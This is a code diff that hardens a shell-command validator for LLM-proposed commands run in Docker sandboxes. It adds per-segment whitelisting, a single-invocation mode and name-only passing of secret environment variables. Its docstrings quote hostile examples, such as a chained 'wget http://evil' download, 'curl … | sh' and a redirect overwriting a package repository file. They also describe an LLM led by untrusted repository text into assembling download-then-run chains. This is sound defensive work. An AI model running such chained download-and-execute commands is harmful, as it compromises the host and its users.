@@ -37,11 +37,53 @@ logger = logging.getLogger(__name__)
 # ============================================================================
 
 
+# Environment variables whose VALUE must never appear in a process
+_SECRET_ENV_MARKERS = (
+    "TOKEN",
+    "SECRET",
+    "PASSWORD",
+    "PASSWD",
+    "API_KEY",
+    "AUTH",
+    "CREDENTIAL",
+    "GIT_CONFIG_VALUE",
+)
+
+
+def _is_secret_env_key(env_key: str) -> bool:
+    """Return True when ``env_key``'s value must stay out of argv."""
+    upper = env_key.upper()
+    return any(marker in upper for marker in _SECRET_ENV_MARKERS)
+
+
+def _strip_quoted(command: str) -> str:
+    """Return ``command`` with quoted regions removed.
+
+    Used so metacharacter checks only see SHELL-significant characters,
+    not the same character appearing inside a quoted literal (e.g. a
+    ``>`` inside a grep pattern).
+    """
+    out: list = []
+    quote = None
+    for ch in command:
+        if quote:
+            if ch == quote:
+                quote = None
+            continue
+        if ch in ("'", '"'):
+            quote = ch
+            continue
+        out.append(ch)
+    return "".join(out)
+
+
 class CommandValidator:
     """Smart command validation that allows legitimate operations.
 
     Uses a whitelist approach: explicitly allow safe patterns and
-    block dangerous ones.
+    block dangerous ones. Validation is per SEGMENT (see
+    :meth:`split_segments`) so a chained tail cannot ride along on an
+    approved first token.
     """
 
     # Allowed command patterns (whitelist)
@@ -119,9 +161,26 @@ class CommandValidator:
         # Environment and Shell
         r"^export\s+",
         r"^env\s+",
-        r"^[A-Z_][A-Z0-9_.]*=.*",  # Environment variable assignments
+        # Variable assignments. Lower-case names are allowed because
+        # internal helper scripts use them (e.g. `_rc=$?` in the static
+        # archive probe); segment validation makes this safe.
+        r"^[A-Za-z_][A-Za-z0-9_.]*=.*",
         r"^sh\s+",
         r"^bash\s+",
+        r"^set\s+-[a-zA-Z]+$",  # `set -e` in bootstrap scripts
+        r"^exit\s+\$?[A-Za-z0-9_]*$",  # `exit $_rc`
+        r"^true$",  # no-op left by _strip_bundled_toolchain_packages
+        # Segment-position helpers: these appear AFTER a pipe in
+        # internally-constructed commands and must validate on their
+        # own now that every segment is checked.
+        r"^xargs(\s+.*)?$",
+        r"^head(\s+.*)?$",
+        r"^tail(\s+.*)?$",
+        r"^wc(\s+.*)?$",
+        r"^tr\s+",
+        r"^ar\s+[a-z]+\s+",  # `ar x <archive>` (static-lib arch probe)
+        r"^flock\s+",  # pkg-manager serialization wrapper
+        r"^timeout\s+",  # in-container runaway guard
         # System
         r"^touch\s+",
         r"^chmod\s+",
@@ -216,28 +275,146 @@ class CommandValidator:
         r"\bapt-key\s+adv\b",
     }
 
+    @staticmethod
+    def split_segments(command: str) -> list:
+        """Split a command into shell segments, respecting quoting.
+
+        Splits on the operators that start a NEW command word — ``;``,
+        ``&&``, ``||``, ``|``, ``&`` and newline — while leaving
+        quoted regions (including ``"$(mktemp -d ...)"``) intact.
+
+        Security-critical: the whitelist is applied per segment, so a
+        chained tail cannot ride along on an approved first token.
+
+        Args:
+            command: The raw command string.
+
+        Returns:
+            The non-empty, stripped segments in order.
+        """
+        segments: list = []
+        buf: list = []
+        quote = None
+        i = 0
+        n = len(command)
+        while i < n:
+            ch = command[i]
+            if quote:
+                buf.append(ch)
+                if ch == quote:
+                    quote = None
+                i += 1
+                continue
+            if ch in ("'", '"'):
+                quote = ch
+                buf.append(ch)
+                i += 1
+                continue
+            if ch == "\\" and i + 1 < n:
+                buf.append(ch)
+                buf.append(command[i + 1])
+                i += 2
+                continue
+            if command.startswith("&&", i) or command.startswith("||", i):
+                segments.append("".join(buf))
+                buf = []
+                i += 2
+                continue
+            if ch in ";|&\n":
+                segments.append("".join(buf))
+                buf = []
+                i += 1
+                continue
+            buf.append(ch)
+            i += 1
+        segments.append("".join(buf))
+        return [s.strip() for s in segments if s.strip()]
+
     def is_safe(self, command: str) -> Tuple[bool, str]:
         """Check if a command is safe to execute.
+
+        EVERY segment of a chained command must match the whitelist.
+        Matching only the first token (the old behaviour) approved the
+        whole line, so ``make ; wget http://evil -O /tmp/x`` passed
+        because the ``make`` pattern's trailing wildcard consumed the
+        ``;`` tail.
 
         Returns:
             (is_safe, reason)
         """
-        # Check dangerous patterns first
+        # Check dangerous patterns first, against the whole string so
+        # cross-segment forms (``curl … | sh``) and substitutions
+        # (``$(curl … | sh)``) are still caught.
         for pattern in self.DANGEROUS_PATTERNS:
             if re.search(pattern, command):
                 return False, f"Blocked dangerous pattern: {pattern}"
 
-        # Check if matches safe patterns
-        for pattern in self.SAFE_COMMANDS:
-            if re.match(pattern, command.strip()):
-                return True, "Matches safe command pattern"
+        segments = self.split_segments(command)
+        if not segments:
+            return False, "Empty command"
 
-        # Default deny for unknown patterns
-        logger.warning(
-            f"Unknown command pattern (consider adding to whitelist): "
-            f"{command[:100]}"
-        )
-        return False, "Unknown command pattern (not in whitelist)"
+        for segment in segments:
+            if not any(
+                re.match(pattern, segment) for pattern in self.SAFE_COMMANDS
+            ):
+                logger.warning(
+                    f"Unknown command segment (consider adding to "
+                    f"whitelist): {segment[:100]}"
+                )
+                # Keep the historical wording for a plain (single
+                # command) rejection; only name the offending segment
+                # when the rejection came from a chain, where saying
+                # WHICH part failed is the useful information.
+                if len(segments) == 1:
+                    return False, "Unknown command pattern (not in whitelist)"
+                return (
+                    False,
+                    f"Unknown command pattern in segment: {segment[:80]}",
+                )
+
+        return True, "All segments match safe command patterns"
+
+    def is_safe_single(self, command: str) -> Tuple[bool, str]:
+        """Validate an LLM-authored command as a SINGLE invocation.
+
+        Stricter than :meth:`is_safe`: on top of per-segment whitelist
+        checks, the command may contain at most one real invocation,
+        optionally preceded by a ``cd <dir> &&`` prefix (the idiom the
+        prompts teach). Chaining, piping and redirection are refused.
+
+        Rationale: fixer/investigation commands are supposed to be one
+        build or inspection step. Allowing chains lets an LLM — whose
+        prompt embeds untrusted repo text — assemble a download-then-run
+        sequence out of individually-whitelisted pieces.
+
+        Args:
+            command: The LLM-proposed command.
+
+        Returns:
+            (is_safe, reason)
+        """
+        ok, reason = self.is_safe(command)
+        if not ok:
+            return False, reason
+
+        segments = self.split_segments(command)
+        # Allow a single leading `cd <dir>` companion, nothing else.
+        if len(segments) > 2 or (
+            len(segments) == 2 and not segments[0].startswith("cd ")
+        ):
+            return (
+                False,
+                "Chained commands are not allowed here; use a single "
+                "invocation (optionally prefixed with `cd <dir> &&`)",
+            )
+
+        # Redirection would let a single invocation still write
+        # arbitrary files (e.g. `echo x > /etc/apk/repositories`).
+        for ch in (">", "<"):
+            if ch in _strip_quoted(command):
+                return False, f"Redirection ({ch}) is not allowed here"
+
+        return True, "Single safe invocation"
 
 
 # Global validator instance
@@ -388,7 +565,13 @@ def execute_command(
             # `docker exec` calling convention.
             if extra_env:
                 for env_key, env_val in extra_env.items():
-                    docker_cmd.extend(["--env", f"{env_key}={env_val}"])
+                    if _is_secret_env_key(str(env_key)):
+                        if host_env is None:
+                            host_env = os.environ.copy()
+                        host_env[str(env_key)] = str(env_val)
+                        docker_cmd.extend(["--env", str(env_key)])
+                    else:
+                        docker_cmd.extend(["--env", f"{env_key}={env_val}"])
 
             # Add working directory if specified
             if cwd:
@@ -424,17 +607,6 @@ def execute_command(
                     f"flock -w 120 {lock} sh -c {_shlex.quote(command)}"
                 )
 
-            # Wrap with in-container `timeout` so a runaway process gets
-            # SIGKILLed by the container kernel even if the python-side
-            # docker-exec client is torn down. Without this,
-            # qemu-emulated processes (notably `go build`) orphan after
-            # subprocess.TimeoutExpired and keep burning CPU forever —
-            # see PID 2496758 incident on dnsx (2026-05-21).
-            #
-            # We give the in-container timeout a small head-start (~30s
-            # shorter than python's timeout) so it fires first; python's
-            # timeout remains the belt-and-braces fallback if
-            # `timeout(1)` itself is missing.
             inner_timeout = max(timeout - 30, 10)
             shell_quoted = exec_command.replace("'", "'\"'\"'")
             exec_command = (
@@ -455,6 +627,8 @@ def execute_command(
                 capture_output=True,
                 text=True,
                 timeout=timeout,
+                # Carries the values for any name-only `--env` flags.
+                env=host_env,
             )
         else:
             # Execute on host (for git clone, etc.)
@@ -595,10 +769,6 @@ def _is_pkg_lock_error(result) -> bool:
     )
 
 
-# Backward-compat alias
-_is_apk_lock_error = _is_pkg_lock_error
-
-
 def _is_pkg_command(command: str) -> bool:
     """Check if a command invokes the system package manager.
 
@@ -624,10 +794,6 @@ def _is_pkg_command(command: str) -> bool:
     return False
 
 
-# Backward-compat alias
-_is_apk_command = _is_pkg_command
-
-
 def _fix_pkg_names(command: str) -> str:
     """Auto-correct package names that are wrong for the active distro."""
     from src.platforms import get_active_profile
@@ -645,10 +811,6 @@ def _fix_pkg_names(command: str) -> str:
             f"{command[:80]} → {fixed[:80]}"
         )
     return fixed
-
-
-# Backward-compat alias
-_fix_apk_package_names = _fix_pkg_names
 
 
 # Packages that are bundled in our sandbox images and must NEVER be installed
